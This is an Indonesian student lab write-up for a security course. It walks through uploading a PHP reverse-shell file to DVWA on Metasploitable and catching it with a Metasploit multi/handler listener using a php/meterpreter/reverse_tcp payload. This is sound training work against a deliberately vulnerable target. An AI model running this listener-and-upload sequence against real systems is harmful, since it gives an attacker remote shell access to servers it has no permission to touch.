# Tugas Final Project

### Anggota Kelompok

|Nama      |NRP    |
|---|---|
Rian Danis  | 5114100084
Naufan Arifie | 5114100136
Dimas Hirda P | 5114100147


### DVWA

### Lesson 8

#### 1. Setting Permission di metasploitable
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/change_ownership.PNG)

```bash
sudo chown root /var/www/dvwa/hackeable/uploads/
sudo chmod 775 /var/www/dvwa/hackeable/uploads/
ls -ld /var/www/dvwa/hackeable/uploads/
```

#### 2. Jalankan msfvenom 
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/create_msfvenom.PNG)

#### 3. Edit handler.rb
Masuk ke folder multi
```bash
cd /usr/share/metasploit-framework/modules/exploits/multi
```

Berikan tanda '#' di baris STANCE
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/stance_command.PNG)

#### 3. Buka metasploitable di kali
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/metasploit_correct.PNG)

Lakukan command berikut
```bash
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.31
set LPORT 4444
exploit
```
#### 4. Upload file PHONE_HOME.php
Login terlebih dahulu
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/Login.PNG)

Pastikan security menjadi low
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/set_low.PNG)

Masuk ke halaman upload
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/upload.PNG)

![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/upload_done.PNG)

Cek apakah file terupload di metasploitable
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%208/open_uploads.PNG)

